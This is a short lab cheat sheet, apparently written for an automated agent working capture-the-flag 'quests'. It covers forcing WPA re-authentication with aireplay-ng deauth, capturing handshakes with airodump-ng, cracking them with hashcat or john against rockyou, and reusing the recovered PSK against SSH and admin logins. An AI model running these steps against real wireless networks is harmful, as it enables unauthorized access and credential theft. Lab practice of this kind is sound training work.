---
id: wifi-lab
title: WiFi lab — capture on the AP host, crack on Kali, radio gotchas
triggers: [airodump, aireplay, aircrack, hcxpcapngtool, wpa, handshake, .cap, mac80211, wlan, wifi@]
---

# Wifi & capture cracking

- Capture where the radio is, crack where the tools are: airodump/deauth
  needs the wireless interface on the AP-side host — but `aircrack-ng`,
  `hashcat`, `john` and rockyou live on KALI. `scp` the .cap/.pcap back
  (`-o StrictHostKeyChecking=no`) and crack locally; remote sudo for the
  crack is the wrong end of the wire.
- `.cap` → hashcat: `hcxpcapngtool -o hash.22000 file.cap` then
  `hashcat -m 22000 hash.22000 wordlist`. On a CPU-only VM hashcat wants
  `-D 1` (or errors with no devices). john path: `wpapcap2john file.cap`
  then `john -w=wordlist out.john`.
- WPA cracking only yields the PSK — flags usually hide one step further:
  reuse the PSK against login surfaces (ssh users, admin panels) and read
  proof files where the quest puts them.
- Handshake capture without a client connected: `aireplay-ng --deauth`
  forces a re-auth; keep `airodump-ng` bounded (`timeout 60 airodump-ng
  -w out …`) or it fills the pane forever.

See guide `wifi-radio` for the daemon/radio rebuild traps.
